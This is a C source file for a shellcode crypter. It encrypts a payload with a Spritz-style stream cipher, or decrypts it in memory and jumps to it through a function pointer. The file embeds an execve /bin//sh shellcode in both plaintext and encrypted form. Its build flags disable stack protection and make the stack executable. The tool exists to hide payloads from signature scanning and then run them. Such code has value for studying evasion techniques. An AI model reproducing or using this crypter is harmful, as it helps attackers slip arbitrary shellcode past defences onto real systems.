/* Compilation: gcc -fno-stack-protector -z execstack spritz-crypter.c -o spritz-crypter */
/**********************************************************************
*    spritz-crypter --  Program to encrypt payload with, or
*			to decrypt and execute payload
*			depending on the command line arguments
*                       We are using the experimental SPRITZ cypher
* 
*    Author   : Re4son re4son [ at ] whitedome.com.au
*    Purpose  : to encrypt / decrypt&execute a shellcode
*    Usage    : Encrypt shellcode:    ./spritz-crypter <password> E
		  then copy and paste the shellcode as shellcode below
		  and recompile
		Decrypt and execute:  ./spritz-crypter <password>
**********************************************************************/
/* Spritz cypher derived from:
   Franz Scheerer Software SPRITZ Stream Cipher Algorithm
*/

#include <stdio.h>
#include <string.h>

#define ARRAY_LENGTH	256

/* Plaintext shellcode: */ /*
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; */


/* Encrypted shellcode: */
unsigned char shellcode[] = \
"\xfa\x29\x6a\x0d\xf7\x19\x6a\x31\x28\x45\x31\x7b\xd3\xe1\x63\x2e\x93\xeb\x12\x7c\xd7\xbd\x28\x32\x24";

 
unsigned char spritz(unsigned char *key, unsigned int key_length) {
  static unsigned char S[ARRAY_LENGTH];
  static unsigned int i,j;
  int nrepeat,t;
  
  if (key_length > 0) /* initialize, if key_length greater than zero */
  {
    if (key_length == 1) 
       for (i = 0; i < 256; i++) S[i] = i;
    j = 0;
    for (nrepeat=0; nrepeat<3; nrepeat++){
      for (i = 0; i < 256; i++) {
          j = (j + key[i % key_length] + S[i]) & 255;
          t = S[i]; S[i] = S[j]; S[j]=t;
      }
    }
    i = key[0];
    j = (key_length + key[key_length-1]) & 255;
    for (nrepeat=0; nrepeat<999; nrepeat++){
        i = (i + 1) & 255;      
        j = (j + S[i]) & 255;
        t = S[i]; S[i] = S[j]; S[j]=t;      
    }
    i = 7; j = 8;
   } /* end initialize */

   i = (i + 7) & 255;
   j = (j + S[i]) & 255;
   t = S[i]; S[i] = S[j]; S[j]=t;
   return S[(S[i] + S[j]) & 255];        
}
 
 
int main(int argc, char **argv) {
  unsigned char S[ARRAY_LENGTH];
  unsigned char *encryption_key;
  int encryption_key_length;
  unsigned char data_byte;
  unsigned int i, j, k, w;
  int t, c, counter, ebyte;
  int badchars = 0;
  
  int (*ret)() = (int(*)())shellcode;

  for (i = 0; i < 256; i++)
      S[i] = i;
  if (argc == 1){
      fprintf(stderr,"Please provide a key\n");
      return -1;     
  } else {
	encryption_key = (unsigned char *)argv[1];
	encryption_key_length = strlen((char *)encryption_key);
	if(encryption_key_length > ARRAY_LENGTH)
	{
		printf("Key is too long. It should be less than 256 characters\n");
		return(-1);
	}
      spritz("1", strlen("1"));      
      spritz(argv[1], strlen(argv[1])); 
      spritz("Pass2", strlen("Pass2"));       
  }
  i = ARRAY_LENGTH;  
  while (i > 1) {
     i = i - 1;
     j = spritz("Pass2", 0);
     while ( j > i ){
       j = spritz("Pass2", 0);
     }
     t = S[i]; S[i] = S[j]; S[j] = t;
  } 
  i = spritz("Pass2", 0);
  j = spritz("Pass2", 0);
  k = spritz("Pass2", 0);
  w = (2*spritz("Pass2", 0) + 1) & 255;

  if (argc > 2){
        for (counter=0; counter< strlen(shellcode); counter++){
            data_byte = shellcode[counter];
            i = (i + w) & 255;
            j = (k + S[(j + S[i]) & 255]) & 255;
            k = (k + i + S[j]) & 255;
            t = S[i]; S[i] = S[j]; S[j]=t; 
	    ebyte =  (data_byte ^ S[(j + k) & 255]);
            printf("\\x%02x", ebyte);
	    if (ebyte == 0)
		badchars ++;       
            j = (j + data_byte) & 255;
        }
   	printf("\n");
   	if (badchars > 0){
		printf("\n\t!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
		printf("\t!!              WARNING            !!\n");
		if (badchars == 1)
			printf("\t!!        Found %02d bad char        !!\n", badchars);
		else
			printf("\t!!        Found %02d bad chars       !!\n", badchars);
		printf("\t!!---------------------------------!!\n");
		printf("\t!! Please use a different password !!\n");
		printf("\t!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n");
	}
   } else {
        for (counter=0; counter< strlen(shellcode); counter++){
            data_byte = shellcode[counter];
            i = (i + w) & 255;
            j = (k + S[(j + S[i]) & 255]) & 255;
            k = (k + i + S[j]) & 255;
            t = S[i]; S[i] = S[j]; S[j]=t;
	    shellcode[counter] = (S[(j + k) & 255] ^ data_byte);
            j = (j + (S[(j + k) & 255] ^ data_byte)) & 255;
         }
   ret();
  }
}
